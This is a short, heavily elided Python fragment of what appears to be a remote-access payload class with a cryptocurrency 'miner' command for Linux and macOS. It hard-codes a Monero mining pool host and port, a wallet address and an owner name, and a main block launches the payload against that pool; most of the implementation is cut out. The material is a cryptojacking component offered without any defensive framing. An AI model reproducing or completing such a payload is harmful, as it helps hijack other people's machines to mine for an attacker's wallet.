...
class Payload():
    ...
    @config(platforms=['linux','linux2','darwin'], command=True, usage='miner <cmd> [gulf.moneroocean.stream] [10128] [83ewexCY9sah9gKPtPTDeN5FtpwY1kitRRPnWtXHT3QTjfEwaqbTJGYJwHuGr8jUDd5PMmUSLP3cPFnSxHErAZnXMQrhGwg]')
    def miner(self, args):
        """
...
if __name__ == '__main__':
    _payload = Payload(host='gulf.moneroocean.stream', port='10128', gui='1', owner='Kwoa')
    _payload.run()
